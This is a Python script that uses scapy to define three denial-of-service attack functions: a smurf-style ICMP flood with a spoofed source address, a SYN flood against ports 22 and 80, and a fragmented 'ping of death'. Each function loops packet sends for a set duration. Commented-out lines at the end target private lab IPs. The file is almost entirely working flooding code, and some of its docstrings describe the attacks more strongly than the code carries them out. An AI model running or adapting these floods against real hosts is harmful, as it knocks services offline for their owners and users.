import scapy.all as scapy
import time

def execute_pendant_duree(duree, fonction):
    debut = time.time()
    while (time.time() - debut) < duree:
        fonction()

def smurf_attack(ip_source, ip_dest, duree):
    """Smurf attack
    Distributed denial of service (DDoS) attack in which an attacker attempts
    to saturate a target server with ICMP packets

    Args:
        ip_source (String): the IP of the source machine
        ip_dest (String): the IP of the destination machine
        duree (int): the duration of the attack
    """
    print("Smurf attack on " + ip_dest + " for " + str(duree) + " seconds")
    execute_pendant_duree(duree, lambda: scapy.send(scapy.IP(src=ip_source, dst=ip_dest)/scapy.ICMP()))

def syn_flooding_attack(ip_dest, duree):
    """Syn flooding attack
    Computer attack aiming at achieving a denial of service.
    It is applied within the TCP protocol and consists in sending a succession of SYN requests to the target

    Args:
        ip_dest (String): the IP of the destination machine
        duree (int): the duration of the attack
    """
    print("Syn flooding attack on " + ip_dest + " for " + str(duree) + " seconds")
    topt = [('Timestamp', (10, 0))]
    p = scapy.IP(dst=ip_dest, id=1111, ttl=99)/scapy.TCP(sport=scapy.RandShort(),
                                                         dport=[22, 80], seq=12345, ack=1000, window=1000, flags="S", options=topt)/"SYNFlood"
    execute_pendant_duree(duree, lambda: scapy.send(p))

def ping_of_death(ip_dest, duree):
    """Ping of death attack
    Denial of service attack performed by sending a malformed ping packet to a target machine

    Args:
        ip_dest (String): the IP of the destination machine
        duree (int): the duration of the attack
    """
    print("Ping of death attack on " + ip_dest + " for " + str(duree) + " seconds")
    execute_pendant_duree(duree, lambda: scapy.send(scapy.fragment(scapy.IP(dst=ip_dest)/scapy.ICMP()/('X' * 600))))



# ip_source = '10.0.2.16'
# ip_dest = '192.168.86.213'

# smurf_attack(ip_source, ip_dest, 10)
# syn_flooding_attack(ip_dest, 10)
# ping_of_death(ip_dest, 10)

